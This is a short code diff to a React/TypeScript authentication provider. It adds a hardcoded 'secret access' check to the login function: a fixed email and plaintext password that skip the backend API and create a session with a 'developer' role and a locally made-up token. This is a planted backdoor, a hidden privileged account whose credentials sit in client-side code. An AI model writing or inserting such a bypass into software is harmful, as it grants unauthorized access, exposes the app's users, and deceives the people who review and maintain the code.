@@ -43,6 +43,20 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
   };
 
   const login = async (email: string, password: string, role: string) => {
+    // Hardcoded developer account - secret access
+    if (email === "akshad@gmail.com" && password === "akshad@123") {
+      const developerUser: User = {
+        id: "dev_admin_001",
+        email: "akshad@gmail.com",
+        name: "Developer Admin",
+        role: "developer",
+        createdAt: new Date().toISOString(),
+      };
+      const developerToken = `dev_token_${Date.now()}`;
+      storeSession(developerUser, developerToken);
+      return developerUser;
+    }
+
     const API_URL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:3001/api';
     const res = await fetch(`${API_URL}/auth/login`, {
       method: "POST",
